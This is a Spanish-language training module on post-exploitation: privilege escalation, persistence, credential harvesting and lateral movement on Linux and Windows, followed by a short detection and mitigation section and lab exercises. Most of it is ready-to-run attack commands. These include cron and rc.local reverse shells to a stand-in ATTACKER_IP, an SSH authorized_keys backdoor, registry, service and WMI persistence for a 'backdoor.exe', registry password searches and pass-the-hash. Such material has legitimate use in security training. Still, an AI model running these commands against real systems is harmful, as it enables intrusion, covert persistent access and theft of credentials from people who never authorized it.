
# Post Exploitation Tactics - Técnicas Avanzadas

## Objetivos de Aprendizaje
- Comprender las fases de post-explotación
- Dominar técnicas de escalada de privilegios
- Implementar métodos de persistencia
- Desarrollar estrategias de movimiento lateral

## Introducción

La post-explotación es la fase que sigue inmediatamente después de obtener acceso inicial a un sistema. Es crucial para:

- **Escalada de privilegios**: Obtener mayores permisos en el sistema
- **Persistencia**: Mantener acceso a largo plazo
- **Reconocimiento interno**: Mapear la red desde dentro
- **Movimiento lateral**: Expandirse a otros sistemas
- **Exfiltración**: Extraer datos valiosos

## Fase 1: Situational Awareness

### Reconocimiento del Sistema

```bash
# Linux - Información básica del sistema
whoami
id
uname -a
cat /etc/os-release
ps aux
netstat -tulpn

# Windows - Información básica
whoami /priv
systeminfo
tasklist
netstat -an
```

### Enumeración de Red

```bash
# Descubrir hosts activos en la red local
nmap -sn 192.168.1.0/24

# Escaneo rápido de puertos comunes
nmap -F --top-ports 1000 192.168.1.0/24

# Identificar servicios críticos
nmap -sV -p 22,80,135,139,445,3389 192.168.1.0/24
```

## Fase 2: Escalada de Privilegios

### Linux Privilege Escalation

#### Búsqueda de Vulnerabilidades del Kernel

```bash
# Verificar versión del kernel
uname -r

# Buscar exploits conocidos
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# Revisar capabilities
getcap -r / 2>/dev/null
```

#### SUID/SGID Binaries

```bash
# Buscar binarios con SUID
find / -perm -u=s -type f 2>/dev/null

# Buscar binarios con SGID  
find / -perm -g=s -type f 2>/dev/null

# Verificar GTFOBins para binarios encontrados
# https://gtfobins.github.io/
```

#### Cron Jobs y Scripts

```bash
# Revisar cron jobs del sistema
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Buscar scripts ejecutables por otros usuarios
find / -type f -executable -world-writable 2>/dev/null
```

### Windows Privilege Escalation

#### Información de Privilegios

```powershell
# Verificar privilegios actuales
whoami /priv

# Listar usuarios locales
net user

# Información de grupos
net localgroup administrators
```

#### Servicios Vulnerables

```powershell
# Listar servicios y sus rutas
wmic service get name,displayname,pathname,startmode

# Buscar servicios con rutas sin comillas
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

#### Registry y Configuraciones

```powershell
# Buscar passwords en registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Revisar configuraciones de autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

## Fase 3: Técnicas de Persistencia

### Linux Persistence

#### Backdoors en SSH

```bash
# Agregar clave SSH autorizada
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

#### Cron Jobs Maliciosos

```bash
# Agregar cron job para reverse shell
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
```

#### Modificación de Scripts de Sistema

```bash
# Agregar backdoor a script de inicio
echo "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &" >> /etc/rc.local
```

### Windows Persistence

#### Registry Run Keys

```powershell
# Agregar entrada en registry para auto-inicio
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\backdoor.exe"
```

#### Servicios Maliciosos

```powershell
# Crear servicio persistente
sc create "WindowsUpdate" binpath="C:\backdoor.exe" start=auto
sc start "WindowsUpdate"
```

#### WMI Event Subscriptions

```powershell
# Crear event subscription para persistencia
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter47", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\backdoor.exe", CommandLineTemplate="C:\backdoor.exe"
```

## Fase 4: Movimiento Lateral

### Enumeración de Credenciales

#### Linux Credential Harvesting

```bash
# Buscar archivos de configuración con passwords
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# Revisar historial de comandos
cat ~/.bash_history
cat ~/.mysql_history
```

#### Windows Credential Harvesting

```powershell
# Extraer hashes con Mimikatz (simulado)
# sekurlsa::logonpasswords
# sekurlsa::wdigest

# Buscar credenciales guardadas
cmdkey /list

# Credential Manager
rundll32.exe keymgr.dll,KRShowKeyMgr
```

### Técnicas de Lateral Movement

#### Pass-the-Hash (Windows)

```bash
# Usando herramientas como pth-winexe (simulado)
pth-winexe -U DOMAIN/user%LM:NT //target.ip cmd.exe
```

#### SSH Key Reuse (Linux)

```bash
# Buscar claves SSH en el sistema comprometido
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Usar claves encontradas para acceder a otros sistemas
ssh -i /path/to/key user@target_host
```

## Fase 5: Detección y Mitigación

### Indicadores de Post-Explotación

#### Logs a Monitorear

```bash
# Linux - Logs importantes
/var/log/auth.log          # Autenticaciones
/var/log/syslog           # Sistema general
/var/log/cron.log         # Cron jobs
~/.bash_history           # Historial de comandos

# Windows - Event Logs
Security Event Log (4624, 4625, 4648, 4672)
System Event Log (7045 - Service installation)
Application Logs
PowerShell Logs (4103, 4104)
```

#### Herramientas de Detección

```bash
# Herramientas para Linux
rkhunter --check          # Rootkit hunter
chkrootkit                # Otro detector de rootkits
aide --check              # File integrity checker

# Para Windows
sfc /scannow              # System file checker
Get-WinEvent              # PowerShell para event logs
```

### Estrategias de Mitigación

1. **Hardening del Sistema**
   - Parches regulares
   - Configuración segura de servicios
   - Principio de menor privilegio

2. **Monitoreo Continuo**
   - SIEM/Log analysis
   - Network monitoring
   - Behavioral analysis

3. **Segmentación de Red**
   - VLANs para limitar movimiento lateral
   - Firewalls internos
   - Zero-trust architecture

## Laboratorio Práctico

### Ejercicio 1: Escalada Linux

1. Accede al laboratorio con usuario limitado
2. Enumera el sistema en busca de vectores de escalada
3. Explota una vulnerabilidad SUID o sudo
4. Obtén acceso root
5. Implementa persistencia

### Ejercicio 2: Post-Exploitation Windows

1. Conecta con una sesión Meterpreter simulada
2. Enumera el sistema Windows
3. Encuentra y explota un servicio vulnerable
4. Migra a un proceso más estable
5. Implementa persistencia via registry

### Ejercicio 3: Movimiento Lateral

1. Desde el sistema comprometido, enumera la red
2. Identifica objetivos de alto valor
3. Recolecta credenciales del sistema actual
4. Utiliza las credenciales para acceder a otro sistema
5. Repite el proceso de post-explotación

## Evaluación

### Preguntas de Revisión

1. ¿Cuáles son las principales fases de post-explotación?
2. ¿Qué métodos de escalada de privilegios son más comunes en Linux?
3. ¿Cómo se puede detectar actividad de post-explotación?
4. ¿Cuáles son las mejores prácticas para prevenir movimiento lateral?

### Desafío Final

Implementa un escenario completo de post-explotación que incluya:
- Reconocimiento inicial
- Escalada de privilegios
- Persistencia
- Movimiento lateral a un segundo sistema
- Exfiltración simulada de datos

## Recursos Adicionales

- **MITRE ATT&CK Framework**: [attack.mitre.org](https://attack.mitre.org)
- **GTFOBins**: [gtfobins.github.io](https://gtfobins.github.io)
- **LOLBAS**: [lolbas-project.github.io](https://lolbas-project.github.io)
- **PayloadsAllTheThings**: Repositorio de payloads y técnicas

---

**⚠️ Aviso Legal**: Este contenido es estrictamente educativo. Usar estas técnicas sin autorización es ilegal. Solo practica en entornos controlados y con permisos explícitos.
